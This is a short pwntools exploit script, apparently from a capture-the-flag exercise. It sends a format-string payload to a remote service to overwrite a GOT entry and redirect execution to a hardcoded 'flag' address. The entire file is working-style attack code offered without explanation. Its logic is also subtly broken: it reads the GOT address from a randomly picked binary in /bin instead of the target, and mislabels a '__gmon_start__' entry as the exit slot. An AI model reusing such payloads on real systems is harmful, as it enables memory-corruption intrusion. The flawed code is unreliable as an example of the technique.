# coding=utf-8
from pwn import *
from random import *
import os
import signal

local = False
lists = list()
for i in os.listdir("/bin"):
    if os.path.islink("/bin/" + i):
        pass
    else:
        lists.append(i)
shuffle(lists)


def sigalarm_handler(num, stack):
    log.warn("Timeout!Continue it!")


signal.signal(signal.SIGALRM, sigalarm_handler)


def method8(ip, port):
    log.info("Method 8 applied!")
    r = remote(ip, port)
    # gdb.attach(r, '''
    #	b *0x08048724
    #	c''')
    signal.alarm(5)
    binary = ELF("/bin/" + lists[0])
    FLAG = 0x0804870b
    # print(binary.got)
    EXIT_GOT = binary.got['__gmon_start__']
    FLAG_LOW = FLAG & 0xffff
    FLAG_HIGH = (FLAG & 0xffff0000) >> 16
    s = p32(EXIT_GOT)
    s += p32(EXIT_GOT + 2)
    s += '%10$lln'  # clears the already existing exit address
    s += '%{}x%11$hn'.format(FLAG_HIGH - 78)
    s += '%{}x%10$hn'.format(FLAG_LOW - FLAG_HIGH)
    r.sendline(s)
    r.close()


if __name__ == "__main__":
    method8("127.0.0.1", 80)
